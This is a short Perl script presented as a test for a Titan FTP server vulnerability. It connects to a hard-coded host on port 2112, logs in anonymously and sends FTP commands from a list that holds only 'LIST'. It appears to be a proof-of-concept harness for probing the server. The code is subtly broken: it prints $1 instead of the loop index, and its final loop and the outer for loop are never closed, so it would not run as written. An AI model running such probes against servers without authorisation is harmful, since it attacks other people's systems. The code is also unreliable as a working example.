#!/usr/bin/perl
# Test for Titan FTP server security vulnerability

use IO::Socket;

$host = "192.168.1.243";

my @combination;
$combination[0] = "LIST \r\n";

for (my $i = 0; $combination[$i] ; $i++)
{
 print "Combination: $1\n";

 $remote = IO::Socket::INET->new ( Proto => "tcp",
     PeerAddr => $host,
     PeerPort => "2112",
     );
 unless ($remote) { die "cannot connect to ftp daemon on $host" }

 print "connected\n";
 while (<$remote>)
 {
  print $_;
  if (/220 /)
  {
   last;
  }
 }

 $remote->autoflush(1);

 my $ftp = "USER anonymous\r\n";

 print $remote $ftp;
 print $ftp;

 while (<$remote>)
 {
  print $_;
  if (/331 /)
  {
   last;
  }
 }

 $ftp = "PASS a\@b.com\r\n";
 print $remote $ftp;
 print $ftp;
 
 while (<$remote>)
 {
  print $_;
  if (/230 /)
  {
   last;
  }
 }
 
 $ftp = $combination[$i];

 print $remote $ftp;
 print $ftp;

 while (<$remote>)
 {
  print $_;
  if (/150 /)
  {
   last;
  }
 

 close $remote;
}
